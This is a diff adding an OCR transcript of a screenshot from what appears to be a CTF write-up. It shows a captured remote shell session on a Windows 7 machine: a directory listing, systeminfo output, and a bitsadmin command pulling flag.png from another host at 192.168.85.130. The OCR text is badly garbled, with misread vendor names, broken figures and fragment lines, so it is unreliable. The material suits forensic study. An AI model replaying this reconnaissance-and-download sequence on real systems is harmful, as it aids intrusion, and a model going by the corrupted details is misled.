@@ -1,0 +1,54 @@
+# OCR: 4ed01135a5d1eaa665ff2078eec8b7c5.jpg
+# 来源: .\02-WriteUp\2024\4ed01135a5d1eaa665ff2078eec8b7c5.jpg
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-08-31 15:28
+
+Md Wireshark 388 TCP Hi (tcp.stream eq 1315) . 诊 pcapng
+2009/07/14 09
+2009/07/14 的
+201,216 xwtpdui.dl1
+129,536 xwtpw32.d11
+2009/07/14 17: <DIR> zh-CHS
+2009/07/14 17 <DIR> zh-cN
+2009/07/14 11 <DIR> zh-HK
+2009/07/14 11 <DIR> E
+2009/07/14 09 366,080 zipfldr.dll
+1,105,151,751 。
++ 51,721,289,728 。
+C:\Windows \system32>systeminfo
+systeminfo
+WIN-H1D59GQEHOT
+Microsoft Windows 7 ......
+6.1.7680 .... Build 7600
+Microsoft Corporation
+Multiprocessor Free
+Windows ....
+99392-918-5000002-85642
+2019/6/8, 14:55:50
+2019/6/13, 18:50:33
+Veware, Inc.
+VWiware Virtual Platform
+x64-based PC
+ae.
+[oi]: Intel64 Family 6 Model 158 Stepping 9 GenuineIntel ~3600 Mhz
+Phoenix Technologies LTD 6.00, 2018/4/13
+C:\Windows
+C:\Windows \system32
+\Device\HarddiskVolumet
+zh-cn3.
+3n
+(UTC#98:00).
+2,047 MB
+1,299 MB
+4,095 MB.
+3,044 MB
+1,051 MB
+E : C:\pagefile.sys
+朋 WORKGROUP
+c
+[02]: Intel(R) PRO/1000 MT Network Connection
+DHCP:
+。 为 吴
+[8HJ: 192.168.85.250
+C:\Windows \system32>bitsadmin /rawreturn /transfer getfile http: //192.168.85.130:9011/flag.png c:\flag-png
+bitsadmin /rawreturn /transfer getfile http: //192.168.85.130:9011/flag.png c:\Flag.png
